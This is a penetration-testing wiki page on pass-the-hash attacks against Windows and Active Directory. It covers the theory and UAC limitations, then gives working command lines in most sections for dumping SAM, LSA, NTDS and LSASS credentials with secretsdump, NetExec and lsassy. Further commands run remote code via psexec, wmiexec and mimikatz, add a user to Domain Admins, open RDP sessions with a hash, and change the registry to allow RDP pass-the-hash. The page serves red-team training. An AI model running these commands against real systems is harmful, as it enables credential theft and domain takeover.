---
description: MITRE ATT&CK™ Sub-technique T1550.002
---

# Pass the hash

## Theory

An attacker knowing a user's NT hash can use it to authenticate over NTLM (pass-the-hash) (or indirectly over Kerberos with [overpass-the-hash](../kerberos/ptk.md)).

## Practice

There are many tools that implement pass-the-hash: [Impacket scripts](https://github.com/SecureAuthCorp/impacket) (Python) ([psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py), [smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py), [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)...), [NetExec](https://github.com/Pennyw0rth/NetExec) (Python), [FreeRDP](https://github.com/FreeRDP/FreeRDP) (C), [mimikatz](https://github.com/gentilkiwi/mimikatz) (C), [lsassy](https://github.com/Hackndo/lsassy) (Python), [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) (Python) and many more.

{% tabs %}
{% tab title="Credentials dumping" %}
The Impacket script [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python) has the ability to remotely dump hashes and LSA secrets from a machine (`LMhash` can be empty) (see [dumping credentials from registry hives](../credentials/dumping.md#windows-computer-registry-hives)).

```bash
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```

[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](../credentials/dumping.md#windows-computer-registry-hives)).

```bash
netexec smb $TARGETS -u $USER -H $NThash --sam --local-auth
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --lsa
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --ntds
```

[Lsassy](https://github.com/Hackndo/lsassy) (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [NetExec](https://github.com/Pennyw0rth/NetExec) module (see [dumping credentials from lsass process memory](../credentials/dumping.md#windows-computer-lsass-exe)).

```bash
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
lsassy -u $USER -H $NThash $TARGETS
lsassy -d $DOMAIN -u $USER -H $NThash $TARGETS
```
{% endtab %}

{% tab title="Command execution" %}
Some Impacket scripts enable testers to execute commands on target systems with pass-the-hash (`LMhash` can be empty).

```bash
psexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
smbexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
wmiexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
atexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
dcomexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
```

[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets

```bash
netexec winrm $TARGETS -d $DOMAIN -u $USER -p $PASSWORD -x whoami
netexec smb $TARGETS --local-auth -u $USER -H $NThash -x whoami
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -x whoami
```

On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can pass-the-hash and open an elevated command prompt.

```bash
sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NThash
```
{% endtab %}

{% tab title="AD operations" %}
The [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) (Python) can be used from a Linux system to operate LDAP queries, add a user to a group and so on (`LMhash` can be `ffffffffffffffffffffffffffffffff`).

```bash
pth-net rpc group members "Domain admins" -U 'Domain/User%LMhash:NThash' -S $DOMAIN_CONTROLLER
pth-net rpc group addmem "Domain admins" Shutdown -U 'Domain/Admin%LMhash:NThash' -S $DOMAIN_CONTROLLER
```
{% endtab %}

{% tab title="RDP access" %}
[FreeRDP](https://github.com/FreeRDP/FreeRDP) (C) has the ability to do pass-the-hash for opening RDP sessions.

```bash
xfreerdp /u:$USER /d:$DOMAIN /pth:'LMhash:NThash' /v:$TARGET /h:1010 /w:1920
```
{% endtab %}
{% endtabs %}

### Limitations, tips and tricks

{% hint style="warning" %}
**UAC limits pass-the-hash**

UAC (User Account Control) limits which local users can do remote administration operations. And since most of the attacks exploiting pass-the-hash rely on remote admin operations, it affects this technique.

* the registry key `LocalAccountTokenFilterPolicy` is set to `0` by default. It means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to do remote administration tasks. Setting it to `1` allows the other local admins as well.
* the registry key `FilterAdministratorToken` is set to `0` by default. It allows the built-in local admin account (RID-500, "Administrator") to do remote administration tasks. If set to `1`, it doesn't.

In short, by default, only the following accounts can fully take advantage of pass-the-hash:

* **local accounts** : the built-in, RID-500, "Administrator" account
* **domain accounts** : all domain accounts with local admin rights
{% endhint %}

{% hint style="warning" %}
**RDP Pass-the-hash**

[Restricted Admin Mode ](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn408190\(v=ws.11\)#restricted-admin-mode-for-remote-desktop-connection)must be enabled to allow pass-the-hash attacks over RDP. \
It is disabled by default, but we can enable it via the `DisableRestrictedAdmin` registry entry, as follows:

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```
{% endhint %}

{% hint style="info" %}
**WinRM enables pass-the-hash**

Testers should look out for environments with WinRM enabled. During the WinRM configuration, the `Enable-PSRemoting` sets the `LocalAccountTokenFilterPolicy` to `1`, allowing all local accounts with admin privileges to do remote admin tasks, hence allowing those accounts to fully take advantage of pass-the-hash.
{% endhint %}

{% hint style="info" %}
**Machine accounts**

Just like with any other domain account, a machine account's NT hash can be used with pass-the-hash, but it is not possible to operate remote operations that require local admin rights (such as [SAM & LSA secrets dump](../../../redteam/credentials/os-credentials/windows-and-active-directory/sam-and-lsa-secrets.md)). These operations can instead be conducted with a [Silver Ticket](../kerberos/forged-tickets/#silver-ticket) since the machine accounts validates Kerberos tickets used to authenticate to a said computer/service.

A domain controller machine account's NT hash can be used with pass-the-hash to [dump the domain hashes (NTDS.dit)](broken-reference/).
{% endhint %}

## References

{% embed url="https://en.hackndo.com/pass-the-hash/" %}

{% embed url="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" %}
